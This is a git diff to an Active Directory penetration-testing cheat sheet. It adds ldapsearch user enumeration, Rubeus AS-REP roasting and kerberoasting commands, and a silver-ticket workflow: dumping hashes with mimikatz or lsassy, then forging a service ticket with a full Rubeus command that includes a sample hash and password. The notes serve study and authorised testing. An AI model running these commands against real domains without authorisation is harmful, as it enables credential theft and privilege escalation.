@@ -142,6 +142,10 @@ For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-serv
 * NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
 * Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)
 
+## Users discovery
+
+`ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`
+
 ## Sniffing using Bloodhound
 
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
@@ -184,16 +188,17 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 * Kerberos brute-force
 * ASREPRoast
 * Kerberoasting
-* Pass the key
+* Pass the hash
+* Pass the Ticket
+* Overpass the Hash
 * Pass the ticket
 * Silver ticket
 * Golden ticket
 
 ## Brute Force ASREP roast
 
-* Sometimes remote access if possible if PREAUTH is misconfigure. Just try bruteforcing if
-* Important: need list of valid users! Check users using: `kerbrute userenum ...`
 * To get user list of users use: `enum4linux`
+* If local access is give then use Rubeus: `Rubeus.exe asreproast`
 
 ```
 
@@ -248,9 +253,15 @@ PSexec can also be yused from windows client
 
 ## Kerberoasting
 
+* If local access is give then use Rubeus: `Rubeus.exe herberoast /stats`
+
+
 * Look for kerberoastable accounts:
 
 `ldapsearch -H ldap://10.11.1.xxx -x -LLL -W -b "dc=xxx,dc=com" "(&(samAccountType=805306368)(servicePrincipalName=*))"`
+
+if credentials available then login using parameters
+`ldapsearch -H ldap://10.11.1.xxx -D 'Domain.com/User' -w 'PAsswrord'` 
  
 * get TGSs for cracking 
 
@@ -290,6 +301,18 @@ Make kirbi ticket from BASE64 blob
 ```
 5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
 6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`
+
+## Silver Ticket
+Silver tickets are essential forged TGS tickets which grant you access to a particular service aka service-tickets
+
+Typical workflow:
+1. Compromise some Computer within AD
+2. Dump Hash: mimikatz, lsassy (more silent)
+3. Forge NTLM hash RC4 (or better) for later use
+compromised password -> https://www.browserling.com/tools/ntlm-hash
+4. Forge ticket using rubeus:
+`Rubeus.exe silver /service:SQL/someDC:6565/SQL /ldap /creduser:lab.local\svc_sql /user:Administrator /rc4:64F12CDDAA88057E06A81B54E73B949B /credpassword:Password1` (nrever use such weak passwords, its for demonstration only)
+
 
 
 ## Hash cracking
